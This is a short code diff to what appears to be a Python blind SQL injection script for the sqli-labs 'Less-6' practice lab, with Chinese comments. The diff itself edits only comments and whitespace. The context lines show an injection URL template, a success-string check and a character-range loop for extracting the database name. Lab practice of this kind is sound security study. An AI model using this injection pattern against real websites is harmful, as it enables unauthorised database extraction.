@@ -5,10 +5,9 @@ conn = requests.Session()
 base_url = "http://172.17.0.2/Less-6/?id=1\" and {payload} --+"
 # 判断成功关键字
 success_flag = "You are in"
-#
 star_char = 32
 end_char = 126
-
+# GET请求
 def send_payload(payload):
     # 发送请求
     url = base_url.format(payload=payload)
@@ -23,7 +22,8 @@ def send_payload(payload):
     except Exception as e:
         print(f"timeout:{e}")
         exit()
-        
+
+
          
 
 #获取数据库的名称
